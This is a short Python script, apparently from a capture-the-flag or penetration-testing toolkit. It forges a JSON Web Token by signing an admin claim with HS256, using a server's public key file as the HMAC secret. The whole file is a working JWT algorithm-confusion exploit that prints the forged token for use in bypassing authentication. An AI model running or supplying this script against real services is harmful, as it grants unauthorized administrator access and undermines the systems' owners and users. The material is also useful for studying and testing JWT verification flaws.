import jwt
from huepy import *
from sys import argv
from os.path import isfile

if __name__ == "__main__":
    if len(argv) < 2:
        print("[!] Please provide an absolute file path for the public key")
    else:
        filepath = argv[1]
        if isfile(filepath):
            key = open(filepath, 'r').read()
            token = jwt.encode({"user": "admin", "authenticated": True}, key, algorithm="HS256").decode()
            print(green("[+] Token is:\n{}".format(token)))
        else:
            raise Exception("[!] File Not found. Please try again")
